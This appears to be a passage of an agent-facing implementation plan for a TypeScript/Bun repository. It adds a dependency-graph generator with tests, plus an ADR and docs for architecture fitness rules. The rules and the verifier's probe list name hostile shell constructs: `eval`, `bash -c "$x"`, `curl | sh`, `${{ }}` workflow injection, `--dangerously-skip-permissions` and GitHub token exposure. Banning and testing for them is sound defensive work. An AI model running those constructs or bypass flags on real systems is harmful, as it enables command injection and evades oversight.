    { source: "src/contexts/x/index.ts", dependencies: [{ resolved: "zod" }] },
  ];
  expect(layerEdges(modules)).toEqual([["cli", "x"]]);
});

test("renders a deterministic mermaid flowchart with a subgraph per context", () => {
  const md = renderGraph([
    ["x/application", "x/domain"],
    ["cli", "x"],
    ["x", "x/application"],
  ]);
  expect(md).toContain("<!-- Generated by tools/docs/gen-dependency-graph.ts. Do not edit. -->");
  expect(md).toContain(
    '  subgraph ctx_x["x"]\n    x["x"]\n    x_application["x/application"]\n    x_domain["x/domain"]\n  end',
  );
  expect(md).toContain('  cli["cli"]');
  expect(md.indexOf("cli --> x")).toBeLessThan(md.indexOf("x --> x_application"));
  expect(renderGraph([["cli", "x"]])).toBe(renderGraph([["cli", "x"]]));
});
```

- [ ] **Step 2: Run it to see it fail**

```bash
bun test tools/docs/gen-dependency-graph.test.ts 2>&1 | grep -E 'error:|^\s*[0-9]+ (pass|fail)'
```

Expected: `error: Cannot find module './gen-dependency-graph'`, `1 fail`.

- [ ] **Step 3: Write the generator**

`tools/docs/gen-dependency-graph.ts` (it calls dependency-cruiser's `cruise` API in-process, about 1 s):

````ts
import { join, resolve } from "node:path";
import { cruise } from "dependency-cruiser";

const ROOT = resolve(import.meta.dir, "../..");
const TARGET_REL = "docs/reference/dependency-graph.md";

type Edge = readonly [from: string, to: string];
interface CruisedModule {
  readonly source: string;
  readonly dependencies: readonly { readonly resolved: string }[];
}

/** The node a source file belongs to: a context layer, an adapter, the kernel or an entry point. */
export function groupOf(path: string): string | undefined {
  const parts = path.split("/");
  if (parts[0] !== "src" || parts.length < 2) return undefined;
  const [, top, a, b] = parts;
  if (top === "contexts" && a) return b === "domain" || b === "application" ? `${a}/${b}` : a;
  if (top === "adapters") return parts.length > 3 && a ? `adapters/${a}` : "adapters";
  if (top === "shared" && a === "kernel") return "kernel";
  if (top === "cli" || top === "cli.ts") return "cli";
  return top?.replace(/\.ts$/, "");
}

/** Unique group → group edges between different groups, sorted. */
export function layerEdges(modules: readonly CruisedModule[]): Edge[] {
  const seen = new Map<string, Edge>();
  for (const m of modules) {
    const from = groupOf(m.source);
    for (const d of m.dependencies) {
      const to = groupOf(d.resolved);
      if (from && to && from !== to) seen.set(`${from}\0${to}`, [from, to]);
    }
  }
  return [...seen.values()].sort((x, y) => x[0].localeCompare(y[0]) || x[1].localeCompare(y[1]));
}

const id = (group: string) => group.replace(/[^A-Za-z0-9]/g, "_");
const node = (group: string) => `${id(group)}["${group}"]`;

export function renderGraph(edges: readonly Edge[]): string {
  const groups = [...new Set(edges.flat())].sort();
  // "x" and "x/domain" share the subgraph "x"; so do "adapters" and "adapters/github".
  const clusterOf = (g: string): string | undefined => {
    const head = g.split("/")[0] ?? g;
    return groups.some((x) => x.startsWith(`${head}/`)) ? head : undefined;
  };
  const clusters = [...new Set(groups.map(clusterOf).filter((c) => c !== undefined))].sort();
  const lines = ["flowchart LR"];
  for (const c of clusters) {
    lines.push(`  subgraph ctx_${id(c)}["${c}"]`);
    for (const g of groups.filter((x) => clusterOf(x) === c)) lines.push(`    ${node(g)}`);
    lines.push("  end");
  }
  for (const g of groups.filter((x) => clusterOf(x) === undefined)) lines.push(`  ${node(g)}`);
  for (const [from, to] of edges) lines.push(`  ${id(from)} --> ${id(to)}`);
  return [
    "# Dependency graph",
    "",
    "<!-- Generated by tools/docs/gen-dependency-graph.ts. Do not edit. -->",
    "",
    "Imports between the layers of `src/` (tests and `src/testing` excluded), collapsed to contexts,",
    "their `domain`/`application` layers, adapters, the kernel and the entry points. Rules: [architecture](../architecture.md#fitness-rules).",
    "",
    "```mermaid",
    ...lines,
    "```",
    "",
  ].join("\n");
}

async function render(): Promise<string> {
  const result = await cruise(
    ["src"],
    {
      includeOnly: "^src/",
      exclude: { path: ["\\.test\\.ts$", "^src/testing/"] },
      tsPreCompilationDeps: true,
      baseDir: ROOT,
    },
    undefined,
    { tsConfig: { fileName: join(ROOT, "tsconfig.json") } },
  );
  const output = result.output as unknown as { modules: CruisedModule[] };
  return renderGraph(layerEdges(output.modules));
}

if (import.meta.main) {
  const md = await render();
  const file = Bun.file(join(ROOT, TARGET_REL));
  if (Bun.argv.includes("--check")) {
    if (!(await file.exists()) || (await file.text()) !== md) {
      console.error(`${TARGET_REL} is stale. Run: bun run docs:gen`);
      process.exit(1);
    }
  } else {
    await Bun.write(file, md);
  }
}
````

```bash
bun run format > /dev/null; bun test tools/docs/gen-dependency-graph.test.ts 2>&1 | grep -E '^\s*[0-9]+ (pass|fail)'
```

Expected: `3 pass`, `0 fail`.

- [ ] **Step 4: Chain it into `docs:gen` and `docs:check`**

In `package.json`, replace the two scripts with:

```json
    "docs:gen": "bun tools/docs/gen-cli-reference.ts && bun tools/docs/gen-dependency-graph.ts",
    "docs:check": "bun tools/docs/gen-cli-reference.ts --check && bun tools/docs/gen-dependency-graph.ts --check",
```

- [ ] **Step 5: Missing fails; generate; deterministic; stale fails**

```bash
bun run docs:check > /dev/null 2>&1; echo "missing exit=$?"
bun run docs:gen > /dev/null && cp docs/reference/dependency-graph.md "$TMPDIR/graph1.md"
bun run docs:gen > /dev/null && cmp docs/reference/dependency-graph.md "$TMPDIR/graph1.md" && echo deterministic
echo "  x --> y" >> docs/reference/dependency-graph.md
bun tools/docs/gen-dependency-graph.ts --check; echo "stale exit=$?"
bun run docs:gen > /dev/null && bun run docs:check > /dev/null; echo "check exit=$?"
head -20 docs/reference/dependency-graph.md
```

Expected: `missing exit=1`, `deterministic`, `docs/reference/dependency-graph.md is stale. Run: bun run docs:gen`, `stale exit=1`, `check exit=0`. The file starts with `# Dependency graph`, the generated-file comment, and a `mermaid` block with `flowchart LR`, subgraphs `adapters`, `orchestration` and `platform`, and plain nodes `cli`, `integrations`, `kernel`, `main` and `shutdown`. On the dry run it had 37 edges, among them `cli --> orchestration`, `main --> adapters_github` and `orchestration_application --> orchestration_domain`.

- [ ] **Step 6: Run the definition of done**

```bash
bun run format && git add package.json tools/docs/gen-dependency-graph.ts tools/docs/gen-dependency-graph.test.ts docs/reference/dependency-graph.md && bun run check
```

Expected: passes; the last lines are `✓ parity hello` and `1/1 parity suites passed`.

- [ ] **Step 7: Commit**

```bash
git commit -m "docs(arch): generate the src dependency graph; docs:check fails when stale" -- \
  package.json tools/docs/gen-dependency-graph.ts tools/docs/gen-dependency-graph.test.ts docs/reference/dependency-graph.md
```

From now on, a change that adds an import between layers also needs `bun run docs:gen`; `docs:check` says so.

---

### Task 7: Documentation, spec §3.3 and ADR-0008

**Files:**
- Create: `docs/adr/0008-fitness-functions-everywhere.md`
- Modify: `AGENTS.md`, `docs/architecture.md`, `docs/superpowers/specs/2026-10-13-shipwright-ts-migration-design.md`

Each edit replaces a whole section, so it applies on top of Wave 1a Task 17's wording.

- [ ] **Step 1: Write `docs/adr/0008-fitness-functions-everywhere.md` (write-adr format, under 60 lines)**

```markdown
# 0008. Fitness functions everywhere, with ratchets for legacy code

Status: accepted · Date: 2026-10-14

## Context
Agents write most of Shipwright's code and read `bun run check` failures as instructions. Until
now the architecture rules (F1–F8, F10) covered only `src/`. The 2026-10 incidents came from the
code outside it: `${{ }}` injection in workflows (#8533), shell strings built from request data in
the dashboard (#8534), and bash that runs `eval`, `bash -c "$cmd"` and `curl | bash`, passes
`--dangerously-skip-permissions` and writes to GitHub from 30-odd scripts. `scripts/` holds about
175k lines of bash that is being ported, not rewritten, so its existing violations cannot be fixed
first. F9 was a "follow now" rule with no check.

## Decision
Every part of the repository that runs gets fitness functions in `bun run arch`, with a message that
names the fix:
- `src/`: F5 also catches evasion (`Bun`, `process` or `globalThis` used as a value, computed
  `globalThis[...]`, `node:os`). F9 is enforced: no bypass spelling and no GitHub token name outside
  tests and `adapters/github`, plus the `agentEnv()` unit test.
- `scripts/` (ast-grep's Bash grammar): F11 bash safety (`eval` or `sh -c` with an expansion,
  download piped into a shell, `${{`), F9 permission bypass, F10 `gh` writes.
- `dashboard/` (F12): a second dependency-cruiser config for its layers (D1–D4), and an allowlist
  of services that may spawn processes.

Where existing code violates a rule, the rule is a **ratchet**, not a warning. Its ast-grep rule is
`severity: off` with `metadata: { ratchet: true }`. `tools/arch/findings-ratchet.ts` runs those
rules and compares the count per rule and file with `tools/arch/findings-baseline.json`. A new
file or a higher count fails, and a lower count fails until the baseline is tightened, so the debt
only goes down. `--write-baseline` refuses to raise a count; it seeds only a rule the baseline has
never seen. This is the size ratchet's (F7) contract applied to findings.

A meta-test (`tools/arch/meta.test.ts`) requires every rule to have a rule test with valid and
invalid cases (ast-grep silently skips a test whose rule is missing), a message that starts with
its family (`F11:`, `Dashboard:`) and names a fix, and either `severity: error` or the ratchet
marker. `docs/reference/dependency-graph.md` is generated from the import graph; `docs:check` fails
when it is stale.

## Consequences
- An agent cannot add an `eval`, a `bash -c "$x"`, a bypass flag or a `gh` write to bash, or a
  `child_process` call to `dashboard/server.ts`, and porting a script shrinks the baseline.
- Renaming a file with ratcheted findings needs a hand edit of the baseline, which review sees.
- The ratchet counts, it does not locate: a fix in one place can hide a new finding in the same
  file. Counts per file keep that window small.
- `bun run arch` gains one dependency-cruiser run and one ast-grep scan, about 1.5 s.
- The rules are syntactic. `eval "$(cmd)"` and `cmd=x; eval "$cmd"` are caught; data reaching a
  shell through a file or a function argument is not.
```

- [ ] **Step 2: Replace the fitness section of `AGENTS.md`**

Replace everything from the line `## Fitness rules (spec §3.3)` up to, not including, `## Deployment modes and state` with:

```markdown
## Fitness rules (spec §3.3, ADR-0008)

`bun run arch` enforces: F1 pure domain · F2 application never imports adapters or cli · F3 contexts
only via `index.ts` · F4 no cycles · F5 I/O (`Bun`/`process`/`globalThis` as values, `fetch`,
`node:fs`, `node:os`, network modules) only in `src/adapters`, `src/main.ts`, `src/cli.ts`, `src/testing` ·
F6 Agent SDK only in `adapters/agent` · F7 files ≤ 300 lines, functions ≤ 40 · F8 tests use
`createTestEnv()` · F9 no GitHub token or permission bypass for agents · F10 `gh` writes only in
`src/adapters/github/gh-github-writer.ts` · F11 bash: no `eval`/`sh -c` with expansions, no
`curl | sh`, no `${{` · F12 dashboard layers; subprocesses only in allowlisted services.
Legacy bash and `dashboard/server.ts` debt is ratcheted in `tools/arch/findings-baseline.json`: never
add a finding; after removing some, run `bun tools/arch/findings-ratchet.ts --write-baseline`.
Enforced later: F10 in full (a `FenceToken` on run-scoped writes from Wave 1b; every integration by
the end of Wave 2). A new rule needs a rule test and a message naming the fix (`tools/arch/meta.test.ts`).
```

Then replace the last paragraph, `` `docs/architecture.md`, `docs/adr/`, generated `docs/reference/cli.md` (`bun run docs:gen`).``, with:

```markdown
`docs/architecture.md`, `docs/adr/`, generated `docs/reference/cli.md` and
`docs/reference/dependency-graph.md` (`bun run docs:gen`).
```

Keep the `## Safety` bullets as they are; the F9 bullet stays true.

- [ ] **Step 3: Replace the fitness subsection of `docs/architecture.md` and link the ADR and the graph**

Replace everything from `### Fitness rules` up to, not including, `## Claude access` with:

```markdown
### Fitness rules

Enforced by `bun run arch` (part of `bun run check`). Every failure names the rule and the fix, and
every rule has a rule test with valid and invalid cases (`tools/arch/meta.test.ts` checks both).
Why there are so many, and how ratchets work: [ADR-0008](adr/0008-fitness-functions-everywhere.md).
The current import graph is generated: [`docs/reference/dependency-graph.md`](reference/dependency-graph.md).

| # | Rule | Tool |
|---|---|---|
| F1 | Domain (and the kernel) is pure: no I/O, no Node or Bun built-ins | dependency-cruiser |
| F2 | Application never imports `adapters/` or `cli/` | dependency-cruiser |
| F3 | Contexts meet only at `index.ts`; production code never imports `src/testing/` | dependency-cruiser |
| F4 | No import cycles | dependency-cruiser |
| F5 | I/O (`Bun` members, `fetch`, `process.env`, `node:fs`, `node:os`, `node:process`, network modules, and `Bun`/`process`/`globalThis` used as values) only in `src/adapters`, `src/main.ts`, `src/cli.ts` and `src/testing` | ast-grep |
| F6 | The Agent SDK is imported only by `adapters/agent/` | ast-grep |
| F7 | Files ≤ 300 lines, functions ≤ 40; the baseline may only shrink | size ratchet |
| F8 | Tests use `createTestEnv()` paths, never the real home or environment | ast-grep |
| F9 | No permission bypass and no GitHub token names in `src/` or `dashboard/` (tests and `adapters/github` excepted); `agentEnv()` drops the tokens (unit test). Bash: ratcheted | ast-grep, findings ratchet |
| F10 | `gh` write subcommands only in `src/adapters/github/gh-github-writer.ts`. Bash: ratcheted | ast-grep, findings ratchet |
| F11 | Bash: no `eval` or `sh -c` with an expansion, no download piped into a shell, no `${{` | ast-grep (Bash), findings ratchet |
| F12 | Dashboard: browser bundle and server never import each other (D1); `services/` is the bottom layer (D2); routes never import `server.ts` or each other (D3); no cycles (D4); processes are spawned only by allowlisted services, and shell strings are constant | dependency-cruiser, ast-grep, findings ratchet |

**Ratchets.** Existing violations of F9–F12 in `scripts/` and `dashboard/server.ts` are counted per
rule and file in [`findings-baseline.json`](../tools/arch/findings-baseline.json) by
[`findings-ratchet.ts`](../tools/arch/findings-ratchet.ts). Counts may only go down; a new file or
a higher count fails, and so does a count that dropped without tightening the baseline. Ratcheted
rules are `severity: off` with `metadata: { ratchet: true }`, so `ast-grep scan` skips them and the
ratchet counts them.

Workflows: no `${{ }}` expression of any kind inside a `run:` script or an `actions/github-script`
`script:` body; values go through `env:`. This check is strict, with no baseline.

Config: [`.dependency-cruiser.cjs`](../.dependency-cruiser.cjs),
[`.dependency-cruiser.dashboard.cjs`](../.dependency-cruiser.dashboard.cjs),
[`sgconfig.yml`](../sgconfig.yml) with [`tools/arch/rules/`](../tools/arch/rules) and
[`tools/arch/utils/`](../tools/arch/utils), [`tools/arch/size-ratchet.ts`](../tools/arch/size-ratchet.ts)
with [`arch-baseline.json`](../tools/arch/arch-baseline.json),
[`tools/arch/workflow-injection.ts`](../tools/arch/workflow-injection.ts).
```

In the `## Decisions` list, add after the `0007` line:

```markdown
- [0008 Fitness functions everywhere, with ratchets for legacy code](adr/0008-fitness-functions-everywhere.md)
```

Replace the last line, ``Generated reference: [`docs/reference/cli.md`](reference/cli.md) (`bun run docs:gen`).``, with:

```markdown
Generated reference: [`docs/reference/cli.md`](reference/cli.md) and
[`docs/reference/dependency-graph.md`](reference/dependency-graph.md) (`bun run docs:gen`).
```

- [ ] **Step 4: Update spec §3.3**

In `docs/superpowers/specs/2026-10-13-shipwright-ts-migration-design.md`, replace the two table rows that start `| F9 |` and `| F10 |` with:

```markdown
| F9 | Agents get no GitHub token and no permission bypass (see below). *Enforced from Wave 1a-arch; bash callers ratcheted.* |
| F10 | GitHub side effects go only through a fenced, idempotent adapter (see below). *`gh` writes confined to the writer from Wave 1a; bash writes ratcheted; every integration by the end of Wave 2.* |
| F11 | Bash safety: no `eval` or `sh -c` with an expansion, no download piped into a shell, no `${{` in `scripts/`. *Ratcheted from Wave 1a-arch.* |
| F12 | Dashboard boundaries: browser bundle and server are separate; `services/` is the bottom layer; routes are independent; no cycles; only allowlisted services spawn processes. *From Wave 1a-arch; `server.ts` ratcheted until the Wave 3 port.* |

Every rule has a rule test with valid and invalid cases and a message that names the fix
(`tools/arch/meta.test.ts`). Existing violations of F9–F12 outside `src/` are counted per rule and
file in `tools/arch/findings-baseline.json` and may only go down (ADR-0008).
```

In the **F9** block below the table, replace:

```markdown
- *How:*
  - an ast-grep rule over `src/**` and `.github/workflows/**`, which bans those names and the token
    names under `adapters/agent/**`;
  - the `agentEnv` unit test, which asserts that tokens are dropped.
- *Status:* the Wave 0 runner already uses an allowlist and `permissionMode: "dontAsk"`.
```

with:

```markdown
- *How:*
  - `F9-no-agent-privilege` (ast-grep) bans the bypass spellings and the token names
    (`GH_TOKEN`, `GITHUB_TOKEN`, `GH_ENTERPRISE_TOKEN`, `GITHUB_ENTERPRISE_TOKEN`) as strings,
    identifiers and keys in `src/**` and `dashboard/**`, except tests and `src/adapters/github/**`;
  - `F9-bash-no-permission-bypass` ratchets the bash callers;
  - the `agentEnv` unit test asserts that every token is dropped.
- *Status:* enforced from Wave 1a-arch. Workflow files carry none of the names today; a workflow
  check joins when one is needed.
```

At the end of §3.3, replace `request data. That rule lands with the dashboard hardening item (Wave 1).` with:

```markdown
request data. That rule lands with the dashboard hardening item (Wave 1a); F12 adds the dashboard's
layering and the subprocess allowlist (Wave 1a-arch).
```

- [ ] **Step 5: Check sizes and links**

```bash
wc -l AGENTS.md docs/adr/0008-fitness-functions-everywhere.md
grep -c 'F9-no-agent-privilege' docs/superpowers/specs/2026-10-13-shipwright-ts-migration-design.md
for f in tools/arch/findings-baseline.json tools/arch/findings-ratchet.ts .dependency-cruiser.dashboard.cjs tools/arch/utils docs/reference/dependency-graph.md docs/adr/0008-fitness-functions-everywhere.md; do test -e "$f" || echo "missing $f"; done
```

Expected: `AGENTS.md` about 79 lines (77 on the dry run, which lacked Task 17's two-line Safety bullet; keep it at or under ~80) and `46 docs/adr/0008-fitness-functions-everywhere.md`; `1`; no `missing` lines.

- [ ] **Step 6: Run the definition of done**

```bash
bun run format && git add AGENTS.md docs/architecture.md docs/adr/0008-fitness-functions-everywhere.md \
  docs/superpowers/specs/2026-10-13-shipwright-ts-migration-design.md && bun run check
```

Expected: passes; the last lines are `✓ parity hello` and `1/1 parity suites passed`.

- [ ] **Step 7: Commit**

```bash
git commit -m "docs: ADR-0008 fitness functions everywhere; F9 enforced, F11 and F12 added" -- \
  AGENTS.md docs/architecture.md docs/adr/0008-fitness-functions-everywhere.md \
  docs/superpowers/specs/2026-10-13-shipwright-ts-migration-design.md
```

---

### Task 8: Independent verification and hand-off

**Files:** none

- [ ] **Step 1: Time the check against Task 0**

```bash
for i in 1 2 3; do /usr/bin/time -p bun run arch > /dev/null 2> "$TMPDIR/arch-time.txt"; grep real "$TMPDIR/arch-time.txt"; done
time bun run check
```

Expected: `bun run arch` about 2 s (1.9–2.3 s on the dry run, from 1.1–1.2 s), and `bun run check` within about 2 s of Task 0's time (11.8–12.3 s against 11.4–12.2 s on the dry run). If the bash scan alone takes more than 1 s (`time bun tools/arch/findings-ratchet.ts`; 0.5 s on the dry run), investigate before handing off.

- [ ] **Step 2: Dispatch the `verifier` subagent**

Prompt: "Verify Wave 1a-arch on branch `wave1/safety` against `docs/superpowers/plans/2026-10-14-wave-1a-arch-fitness.md`. Run `bun run check`. Try to break each rule: add `eval "$x"`, `bash -c "$y"`, `curl … | sh`, `${{ github.event.issue.title }}`, `--dangerously-skip-permissions` and `gh issue comment` to a script that has none and confirm `bun run arch` fails with the rule's fix; alias `const b = Bun` and read `globalThis["process"]` in a domain file; put `permissionMode: \"bypassPermissions\"` and `GH_TOKEN` in `src/adapters/agent`; import `routes/` from `dashboard/services`; add an `execSync` to `dashboard/services/db.ts`; delete a rule test and add an orphan one; raise a baseline count with `--write-baseline`; edit `docs/reference/dependency-graph.md`. Each must fail. Revert every probe." Expected: `PASS` with evidence. On `FAIL`, fix and re-run, up to three cycles; then report what remains.

- [ ] **Step 3: Hand off**

Report the commits, the per-rule baseline totals from Task 4 Step 6 and Task 5 Step 5, and the timing. Do not push; the maintainer pushes with the rest of Wave 1.
